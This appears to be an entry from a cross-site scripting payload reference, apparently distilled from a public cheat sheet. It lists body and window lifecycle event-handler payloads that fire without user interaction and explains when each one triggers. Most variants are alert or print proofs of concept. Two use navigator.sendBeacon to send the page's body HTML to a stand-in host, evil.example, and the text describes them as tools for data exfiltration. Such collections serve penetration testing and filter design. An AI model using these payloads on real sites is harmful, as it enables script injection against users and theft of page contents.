---
title: Body / Window Lifecycle Event Handlers (no interaction)
slug: body-lifecycle-events
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# Body / Window Lifecycle Event Handlers (no interaction)

## Payload

```html
<body onload=alert(1)>
```

## Variants

```html
<body onpageshow=alert(1)>
<body onpagereveal=alert(1)>
<body onhashchange="print()">
<body onbeforeprint=console.log(1)>
<body onpopstate=print()>
<body onresize="print()">
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
<body onmessage=print()>
<body onbeforeunload=navigator.sendBeacon('//evil.example/',document.body.innerHTML)>
<body onunload=navigator.sendBeacon('//evil.example/',document.body.innerHTML)>
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
```

## Context

Fire without user interaction on page lifecycle transitions. `onload` fires as soon as the injected `<body>` element processes; `onresize` fires on viewport resize (trivially triggered in responsive views). `onbeforeunload`/`onunload`/`sendBeacon` are used for data exfiltration rather than proof-of-concept. `onunhandledrejection` requires a rejected promise, which the inline `<script>fetch(...)` provides. Injected via `innerHTML`, reflected body injection, or `document.write`. `onmessage` fires when another frame posts a message — reliable in opener/postMessage scenarios.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
